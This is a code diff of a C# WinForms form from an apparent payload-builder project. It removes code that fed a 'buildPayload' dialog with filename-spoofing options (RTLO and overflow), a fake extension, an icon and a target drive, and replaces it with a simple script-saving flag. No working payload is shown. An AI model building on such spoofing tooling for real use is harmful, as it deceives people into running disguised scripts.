@@ -1,5 +1,4 @@
-﻿using System.Linq;
-using System.Windows.Forms;
+﻿using System.Windows.Forms;
 
 namespace masamangalternatibo {
     public partial class minipad : Form {
@@ -7,31 +6,13 @@ namespace masamangalternatibo {
             InitializeComponent();
         }
 
-        public string[] _tmp;
+        public bool _modifyscript = false;
+        public string _newscript = "";
 
         private void btnCompileScript_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e) {
-            using (buildPayload _bp = new buildPayload()) {
-                using (Form1 _f1 = new Form1()) {
-                    if (_f1.radOverflow.Checked) { _bp.overflowCount = _f1.overflowCount; }
-
-                    if (_f1.radNone.Checked) {
-                        _bp.spoofMode = 0;
-                    }
-                    if (_f1.radOverflow.Checked) {
-                        _bp.spoofMode = 1;
-                    }
-                    if (_f1.radRTLO.Checked) {
-                        _bp.spoofMode = 2;
-                    }
-                    _bp.drive = _f1.drpDrives.GetItemText(_f1.drpDrives.SelectedItem);
-                    _bp.script = mprtb.Text;
-                    _bp.tbFlNm.Text = _tmp[0];
-                    _bp.tbFkExt.Text = _tmp[1];
-                    _bp.isicon = _f1.isicon;
-                    this.Close();
-                    _bp.ShowDialog();
-                }
-            }
+            _modifyscript = true;
+            _newscript = mprtb.Text;
+            this.Close();
         }
     }
 }
